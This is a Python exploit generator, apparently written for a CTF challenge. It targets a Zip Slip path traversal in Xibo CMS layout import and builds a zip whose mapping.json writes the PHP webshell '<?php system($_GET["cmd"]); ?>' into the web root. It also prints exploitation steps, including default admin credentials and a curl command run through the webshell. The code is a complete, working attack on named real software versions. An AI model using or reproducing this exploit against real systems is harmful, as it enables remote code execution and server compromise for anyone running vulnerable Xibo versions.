#!/usr/bin/env python3
"""
Xibo CMS Zip Slip RCE Exploit Generator
GHSA-jj27-x85q-crqv - Path Traversal via Layout Import

This script generates a malicious zip file that exploits a path traversal
vulnerability in Xibo CMS versions 1.8.0 - 2.3.16 and 3.0.0 - 3.3.4.

Usage:
    python3 create_exploit.py

The exploit:
1. Creates a valid Xibo layout export structure
2. Includes a mapping.json with path traversal (../../web/shell.php)
3. Places the webshell at the traversed path in the zip structure
4. When imported, Xibo extracts the file outside the library directory
5. Results in RCE via webshell at /var/www/cms/web/shell.php

Author: CTF Challenge Builder
Date: November 2025
"""

import zipfile
import json

def create_exploit():
    """Generate the malicious zip file for Xibo CMS RCE"""

    # Valid Xibo 3.0 layout structure
    layout_json = {
        "layout": "Exploit Layout",
        "description": "RCE Exploit",
        "layoutDefinitions": {
            "schemaVersion": 3,
            "width": 1920,
            "height": 1080,
            "backgroundColor": "#000000",
            "backgroundzIndex": 0,
            "code": "RCE001",
            "actions": [],
            "regions": [],
            "drawers": []
        }
    }

    # Empty playlist triggers JSON import path
    playlist_json = {}

    # KEY VULNERABILITY: Path traversal in mapping.json
    # Xibo reads from: 'library/' + '../../web/shell.php'
    # Xibo writes to: '/var/www/cms/library/temp/' + '../../web/shell.php'
    # Result: /var/www/cms/web/shell.php
    mapping_json = [{
        "file": "../../web/shell.php",  # Path traversal here
        "name": "shell.php",
        "type": "module"
    }]

    # Simple PHP webshell for command execution
    webshell = b'<?php system($_GET["cmd"]); ?>'

    # Create the malicious zip file
    with zipfile.ZipFile('exploit.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
        # Add required Xibo layout files
        zf.writestr('layout.json', json.dumps(layout_json, indent=2))
        zf.writestr('playlist.json', json.dumps(playlist_json))
        zf.writestr('mapping.json', json.dumps(mapping_json))

        # CRITICAL: File must be at the path specified in mapping.json
        # Xibo calls: $zip->getStream('library/' . $file['file'])
        # So we need: library/../../web/shell.php in the zip
        zf.writestr('library/../../web/shell.php', webshell)

    print("✅ Exploit created: exploit.zip")
    print()
    print("Exploitation steps:")
    print("1. Log in to Xibo CMS (default: xibo_admin / password)")
    print("2. Navigate to: Design → Layouts → Import")
    print("3. Upload exploit.zip")
    print("4. Ignore the JSON error (file is already written!)")
    print("5. Access webshell: http://localhost:8080/shell.php?cmd=id")
    print()
    print("Get flag:")
    print("  curl 'http://localhost:8080/shell.php?cmd=cat%20/var/www/cms/web/flag.txt'")
    print()

if __name__ == "__main__":
    create_exploit()
